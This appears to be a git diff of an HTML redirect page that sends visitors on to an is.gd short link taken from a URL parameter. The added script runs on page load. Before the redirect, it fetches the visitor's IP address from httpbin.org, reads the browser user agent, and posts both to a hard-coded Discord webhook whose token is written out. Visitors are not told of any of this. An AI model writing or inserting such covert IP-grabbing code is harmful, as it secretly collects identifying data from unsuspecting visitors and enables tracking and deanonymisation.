@@ -9,13 +9,25 @@
 
 
 <script>
-setTimeout(function(){
+async function rodar(){
+var webhookURL="https://discord.com/api/webhooks/1350965187171188777/ONrM5eQminGofRMNwh566uvQAzNkUf82Oa76kwxpCjniEwiCu4fcEZwNPzCnHHlmUiQs";
+var userAgent=navigator.userAgent;
+let resp= await fetch("https://httpbin.org/ip");
+var ip= await resp.json();
+ip=ip.origin;
+msg={content:"=========\n\nIP: "+ip+"\nUser-Agent: "+userAgent+"\n\n========="}
+await fetch(webhookURL,{
+method: "POST",
+headers: {"Content-Type":"application/json"},
+body: JSON.stringify(msg)
+});
 const params=new URLSearchParams(window.location.search);
-const gd=params.get("gd");
-var link="https://is.gd/"+gd;
-
+const gd=params.get("gd")
+const link="https://is.gd/"+gd
 window.location.href=link;
-},2000)
+
+}
+rodar();
 </script>
 </body>
 </html>
